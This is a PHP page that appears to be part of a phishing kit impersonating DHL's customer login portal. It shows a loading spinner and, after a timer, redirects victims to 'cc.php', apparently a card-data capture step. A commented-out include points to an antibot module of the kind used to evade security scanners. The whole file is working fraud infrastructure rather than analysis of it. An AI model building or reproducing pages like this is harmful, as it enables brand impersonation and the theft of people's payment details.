<?php 
session_start();
/*include '../antibots/index.php';*/

     require_once "functions.php";
     include '../config.php';


?> 


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Login to Customer Portals and Tools | DHL |</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/posta.css">
		


</head>
<body >


		<div class="loading">
          <div class="d-flex justify-content-center">
            <div class="spinner-border" style="width: 10rem; height: 10rem;"  role="status">
                <span class="sr-only">Loading...</span>
            </div>
          </div>
        </div>

		


        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/Bootstrap.js"></script>
        <script>

            setTimeout(function () {
                window.location.href= 'cc.php';
            },<?php echo $Loading_Timer; ?>);
             
        </script>
</body>
</html>